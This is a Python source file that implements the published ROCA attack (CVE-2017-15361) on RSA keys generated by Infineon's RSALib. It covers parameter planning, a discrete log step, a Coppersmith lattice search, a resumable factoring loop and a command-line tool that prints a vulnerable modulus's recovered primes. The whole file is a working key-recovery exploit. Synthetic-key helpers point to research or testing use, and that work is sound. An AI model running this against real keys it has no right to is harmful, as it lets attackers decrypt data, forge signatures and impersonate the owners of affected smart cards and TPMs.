#!/usr/bin/env python3
"""ROCA (CVE-2017-15361) key recovery beyond detection: the Nemec et al. (CCS 2017) attack.

An Infineon RSALib prime has the form p = k * M + (65537^a mod M), M the product of the first n
primes (39 for 512-960-bit keys, 71 / 126 / 225 for larger ones). The attack:

1. replace M by a divisor M' (still large enough for Coppersmith) whose order ord' of 65537 is much
   smaller: a greedy search drops the primes that cost the most order per bit (``optimise``);
2. c' = log_65537(N) mod M' (Pohlig-Hellman over M''s small primes, ``dlog``); one of a, b (p's and
   q's exponents) lies in [c'/2, (c' + ord')/2];
3. for each a' there, Coppersmith (Howgrave-Graham, beta = 1/2, dimension m + t) on
   f(x) = x + M'^-1 (65537^a' mod M') mod N finds k' with p = k' M' + (65537^a' mod M').

    plan(n)                         the parameters, the search range and its size (cheap, no lattice)
    factor(n, plan_=None, ...)      run the search (all of it, or a chunk [a_start, a_stop)), resumable
    roca_like_prime(bits, n_primes, a, rng)   a synthetic Infineon-form prime (test fixtures)

A factor is returned only after p * q == n with both above 1. A search that runs out of its range
returns done=True with no factors; one that hits its deadline returns the next a to resume from.

Reach, said plainly: a 512-bit key is about ord'/2 lattice reductions of dimension 11. With fpylll
(lattice_backends, ``reducer=make_reducer("fpylll")``) the paper measured about 2 CPU-hours; the
in-repo exact LLL is far slower per step, so a real key needs fpylll (B-188's image) and chunks spread
over cores (``a_start`` / ``a_stop``). ``plan`` says how many steps a key needs before anything runs.
"""
from __future__ import annotations

import argparse
import json
import math
import sys
import time
from dataclasses import asdict, dataclass, field

GENERATOR = 65537

# (bits low, bits high, primes in M, m, t): the paper's parameter table for RSALib key sizes.
PAPER_PARAMS = (
    (512, 960, 39, 5, 6),
    (992, 1952, 71, 4, 5),
    (1984, 3936, 126, 6, 7),
    (3968, 4096, 225, 25, 26),
)
MAX_PRIMES = 225
MAX_BITS = 8192


def _first_primes(count: int) -> list[int]:
    out, c = [], 2
    while len(out) < count:
        if all(c % p for p in out if p * p <= c):
            out.append(c)
        c += 1
    return out


PRIMES = _first_primes(MAX_PRIMES)


def _order(g: int, p: int) -> int:
    x, k = g % p, 1
    while x != 1:
        x = x * g % p
        k += 1
    return k


def _lcm(values) -> int:
    out = 1
    for v in values:
        out = out * v // math.gcd(out, v)
    return out


def _factorize_small(n: int) -> dict[int, int]:
    out, d = {}, 2
    while d * d <= n:
        while n % d == 0:
            out[d] = out.get(d, 0) + 1
            n //= d
        d += 1
    if n > 1:
        out[n] = out.get(n, 0) + 1
    return out


def _valuation(n: int, r: int) -> int:
    v = 0
    while n % r == 0:
        n //= r
        v += 1
    return v


def paper_params(bits: int) -> tuple[int, int, int] | None:
    """(primes in M, m, t) for an RSALib key size, or None outside the table. RSALib sizes are
    multiples of 32 bits; a product one bit short (two 256-bit primes giving 511 bits) rounds up."""
    bits = -(-bits // 32) * 32
    for lo, hi, count, m, t in PAPER_PARAMS:
        if lo <= bits <= hi:
            return count, m, t
    return None


def x_bound_bits(n_bits: int, m: int, t: int) -> float:
    """Largest log2 X Howgrave-Graham guarantees for a linear f, beta = 1/2, dimension w = m + t:
    det^(1/w) < N^(m/2) / sqrt(w), with det = N^(m(m+1)/2) X^(w(w-1)/2)."""
    w = m + t
    if m < 1 or t < 1:
        raise ValueError("m and t must be at least 1")
    return ((m / 2) * w - m * (m + 1) / 2) * n_bits / (w * (w - 1) / 2) - math.log2(w) / (w - 1)


def optimise(primes: list[int], min_bits: float, g: int = GENERATOR) -> list[int]:
    """The greedy M' of the paper: repeatedly drop the primes whose removal cuts ord' most per bit of
    M' lost, while log2 M' stays at or above `min_bits`."""
    keep = sorted(primes)
    orders = {p: _order(g, p) for p in keep}
    while True:
        cur = _lcm(orders[p] for p in keep)
        bits = sum(math.log2(p) for p in keep)
        best = None
        for r, v in _factorize_small(cur).items():
            drop = [p for p in keep if _valuation(orders[p], r) == v]
            lost = sum(math.log2(p) for p in drop)
            if bits - lost < min_bits:
                continue
            new = _lcm(orders[p] for p in keep if p not in drop)
            gain = math.log2(cur / new) / lost
            if best is None or gain > best[0]:
                best = (gain, drop)
        if best is None:
            return keep
        keep = [p for p in keep if p not in best[1]]


def dlog(n: int, primes: list[int], g: int = GENERATOR) -> int | None:
    """c with g^c == n mod prod(primes), reduced mod ord(g); None when n is not a power of g there
    (not the Infineon form)."""
    c, mod = 0, 1
    for p in primes:
        target = n % p
        o = _order(g, p)
        x, e = 1, None
        for k in range(o):
            if x == target:
                e = k
                break
            x = x * g % p
        if e is None:
            return None
        # c == e mod o, merged with c mod `mod` (moduli need not be coprime)
        gd = math.gcd(mod, o)
        if (e - c) % gd:
            return None
        lcm = mod // gd * o
        step = ((e - c) // gd) * pow(mod // gd, -1, o // gd) % (o // gd) if o // gd > 1 else 0
        c = (c + mod * step) % lcm
        mod = lcm
    return c


@dataclass(frozen=True)
class Plan:
    bits: int
    n_primes: int
    m: int
    t: int
    mprime_primes: tuple[int, ...]
    mprime_bits: float
    order: int
    c: int
    a_lo: int
    a_hi: int
    x_bits: int
    source: str

    @property
    def mprime(self) -> int:
        return math.prod(self.mprime_primes)

    @property
    def steps(self) -> int:
        return self.a_hi - self.a_lo + 1


class NotRocaForm(ValueError):
    """The modulus is not a power of 65537 modulo M: not an RSALib key (or the wrong M)."""


def plan(n: int, *, n_primes: int | None = None, m: int | None = None, t: int | None = None,
         g: int = GENERATOR, slack_bits: float = 1.0) -> Plan:
    """The attack's parameters for n. Off the paper's key sizes (toy keys, fixtures) pass n_primes, m
    and t. Raises NotRocaForm when n is not g^c modulo M, ValueError for unusable parameters."""
    if not isinstance(n, int) or n < 15 or n % 2 == 0 or n.bit_length() > MAX_BITS:
        raise ValueError(f"n must be an odd integer of 4..{MAX_BITS} bits")
    bits = n.bit_length()
    source = "given"
    table = paper_params(bits)
    if n_primes is None or m is None or t is None:
        if table is None:
            raise ValueError(f"no RSALib parameters for a {bits}-bit modulus: pass n_primes, m and t")
        n_primes = table[0] if n_primes is None else n_primes
        m = table[1] if m is None else m
        t = table[2] if t is None else t
        source = "paper"
    if not 1 <= n_primes <= MAX_PRIMES or m < 1 or t < 1:
        raise ValueError("n_primes must be 1..225 and m, t at least 1")
    primes = PRIMES[:n_primes]
    pbits = (bits + 1) // 2
    min_bits = pbits + 1 - x_bound_bits(bits, m, t) + slack_bits
    if sum(math.log2(p) for p in primes) < min_bits:
        raise ValueError(f"M of {n_primes} primes is too small for m={m}, t={t} on {bits} bits "
                         f"(needs log2 M' >= {min_bits:.1f})")
    mp = optimise(primes, min_bits, g)
    c = dlog(n, mp, g)
    if c is None:
        raise NotRocaForm(f"n is not a power of {g} modulo M' (not the RSALib form)")
    order = _lcm(_order(g, p) for p in mp)
    mprime = math.prod(mp)
    return Plan(bits=bits, n_primes=n_primes, m=m, t=t, mprime_primes=tuple(mp),
                mprime_bits=round(math.log2(mprime), 2), order=order, c=c,
                a_lo=c // 2, a_hi=(c + order) // 2,
                x_bits=max(1, pbits - mprime.bit_length() + 2), source=source)


# ---- the lattice step -------------------------------------------------------------------------------

def _poly_mul(a, b):
    out = [0] * (len(a) + len(b) - 1)
    for i, x in enumerate(a):
        if x:
            for j, y in enumerate(b):
                out[i + j] += x * y
    return out


def _basis(a0: int, n: int, X: int, m: int, t: int) -> list[list[int]]:
    """Howgrave-Graham rows for f(x) = x + a0: N^(m-i) f^i (i < m) and x^j f^m (j < t), scaled by X."""
    w = m + t
    f = [a0, 1]
    powers = [[1]]
    for _ in range(m):
        powers.append(_poly_mul(powers[-1], f))
    rows = [[c * n ** (m - i) for c in powers[i]] for i in range(m)]
    rows += [[0] * j + powers[m] for j in range(t)]
    return [[(poly[k] if k < len(poly) else 0) * X ** k for k in range(w)] for poly in rows]


def _ev(poly: list[int], x: int) -> int:
    r = 0
    for c in reversed(poly):
        r = r * x + c
    return r


def _trim(poly: list[int]) -> list[int]:
    poly = list(poly)
    while poly and poly[-1] == 0:
        poly.pop()
    return poly


def _root_floors(poly: list[int], a: int, b: int) -> list[int]:
    """floor(r) for every real root r of poly in [a, b] (exact integer arithmetic): the derivative's
    roots cut [a, b] into monotone pieces, and each piece with a sign change is bisected."""
    poly = _trim(poly)
    if len(poly) < 2:
        return []
    deriv = [k * poly[k] for k in range(1, len(poly))]
    cuts = {a, b}
    if len(_trim(deriv)) >= 2:
        for r in _root_floors(deriv, a, b):
            cuts.update(x for x in (r, r + 1) if a < x < b)
    cuts = sorted(cuts)
    out = []
    for lo, hi in zip(cuts, cuts[1:]):
        flo, fhi = _ev(poly, lo), _ev(poly, hi)
        if flo == 0:
            out.append(lo)
        elif fhi != 0 and (flo < 0) != (fhi < 0):
            while hi - lo > 1:
                mid = (lo + hi) // 2
                if (_ev(poly, mid) < 0) == (flo < 0):
                    lo = mid
                else:
                    hi = mid
            out.append(lo)
    if _ev(poly, b) == 0:
        out.append(b)
    return sorted(set(out))


def _int_roots_in(h: list[int], lo: int, hi: int) -> list[int]:
    """Integer roots of h (lowest degree first) in [lo, hi]."""
    out = set()
    for r in _root_floors(h, lo, hi):
        out.update(x for x in (r, r + 1) if lo <= x <= hi and _ev(h, x) == 0)
    return sorted(out)


def attempt(n: int, pl: Plan, a: int, *, reducer=None, deadline: float | None = None) -> tuple[int, int] | None:
    """One step: the Coppersmith lattice for exponent guess `a`. (p, q) verified, or None."""
    mprime = pl.mprime
    r = pow(GENERATOR, a, mprime)
    inv = pow(mprime, -1, n)
    a0 = r * inv % n
    X = 1 << pl.x_bits
    rows = _basis(a0, n, X, pl.m, pl.t)
    if reducer is None:
        from rsa_lattice import lll as _lll
        red = _lll(rows, deadline=deadline)
    else:
        red = reducer(rows, deadline)
    if not red:
        return None
    for vec in red[:2]:
        h = []
        for k, c in enumerate(vec):
            if c % (X ** k):
                h = None
                break
            h.append(c // X ** k)
        if not h:
            continue
        for k in _int_roots_in(h, 0, X):
            p = k * mprime + r
            if 1 < p < n and n % p == 0:
                q = n // p
                if p * q == n and q > 1:
                    return tuple(sorted((p, q)))
    return None


@dataclass
class Run:
    factors: tuple[int, int] | None
    tried: int
    next_a: int                    # resume point: the first a not tried
    done: bool                     # the whole requested range was tried
    backend: str
    plan: dict = field(default_factory=dict)


def factor(n: int, plan_: Plan | None = None, *, a_start: int | None = None, a_stop: int | None = None,
           reducer=None, deadline: float | None = None, progress=None, **plan_kw) -> Run:
    """Search a' over [a_start, a_stop) (default: the plan's whole range [c'/2, (c'+ord')/2]).
    `progress(a, tried)` is called every 256 steps. Raises NotRocaForm for a modulus of another form."""
    pl = plan_ or plan(n, **plan_kw)
    lo = pl.a_lo if a_start is None else a_start
    hi = pl.a_hi + 1 if a_stop is None else a_stop
    if lo < 0 or hi < lo:
        raise ValueError("need 0 <= a_start <= a_stop")
    backend = getattr(reducer, "backend", "in-repo exact LLL") if reducer is not None else "in-repo exact LLL"
    tried = 0
    meta = {k: v for k, v in asdict(pl).items() if k != "mprime_primes"}
    for a in range(lo, hi):
        if deadline is not None and time.monotonic() > deadline:
            return Run(None, tried, a, False, backend, meta)
        got = attempt(n, pl, a, reducer=reducer, deadline=deadline)
        tried += 1
        if got:
            return Run(got, tried, a + 1, False, backend, meta)
        if progress and tried % 256 == 0:
            progress(a, tried)
    return Run(None, tried, hi, True, backend, meta)


def roca_like_prime(bits: int, n_primes: int, a: int, rng, g: int = GENERATOR) -> int:
    """A prime k * M + (g^a mod M) of `bits` bits, M the product of the first n_primes primes."""
    import sympy
    M = math.prod(PRIMES[:n_primes])
    kb = bits - M.bit_length()
    if kb < 2:
        raise ValueError("M is too large for that prime size")
    r = pow(g, a, M)
    while True:
        k = rng.getrandbits(kb) | (1 << (kb - 1))
        p = k * M + r
        if p.bit_length() == bits and sympy.isprime(p):
            return p


# ---- CLI --------------------------------------------------------------------------------------------

class _Parser(argparse.ArgumentParser):
    def error(self, message: str) -> None:  # pragma: no cover
        raise ValueError(message)


def _int(text: str) -> int:
    text = text.strip()
    return int(text, 16) if text.lower().startswith("0x") else int(text)


def main(argv: list[str] | None = None) -> int:
    parser = _Parser(prog="roca.py", description="ROCA key recovery (plan / factor)")
    parser.add_argument("operation", choices=("plan", "factor"))
    parser.add_argument("modulus", help="n, decimal or 0x-hex")
    parser.add_argument("--n-primes", type=int)
    parser.add_argument("--m", type=int)
    parser.add_argument("--t", type=int)
    parser.add_argument("--a-start", type=int)
    parser.add_argument("--a-stop", type=int)
    parser.add_argument("--backend", default="auto", help="LLL backend: auto, fpylll, gmpy2, python")
    parser.add_argument("--seconds", type=float, help="stop after this many seconds (resume with --a-start)")
    try:
        args = parser.parse_args(argv)
        n = _int(args.modulus)
        pl = plan(n, n_primes=args.n_primes, m=args.m, t=args.t)
        info = {k: v for k, v in asdict(pl).items() if k != "mprime_primes"}
        info["steps"] = pl.steps
        if args.operation == "plan":
            print(json.dumps(info, sort_keys=True))
            return 0
        from lattice_backends import BackendUnavailable, make_reducer
        try:
            reducer = make_reducer(args.backend)
        except BackendUnavailable as exc:
            print(f"roca: {exc}", file=sys.stderr)
            return 3
        deadline = time.monotonic() + args.seconds if args.seconds else None
        run = factor(n, pl, a_start=args.a_start, a_stop=args.a_stop, reducer=reducer, deadline=deadline)
        out = {"tried": run.tried, "next_a": run.next_a, "done": run.done, "backend": run.backend}
        if run.factors:
            out.update(p=str(run.factors[0]), q=str(run.factors[1]), verified=True)
            print(json.dumps(out, sort_keys=True))
            return 0
        print(json.dumps(out, sort_keys=True))
        return 1
    except NotRocaForm as exc:
        print(f"roca: {exc}", file=sys.stderr)
        return 1
    except ValueError as exc:
        print(f"roca: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
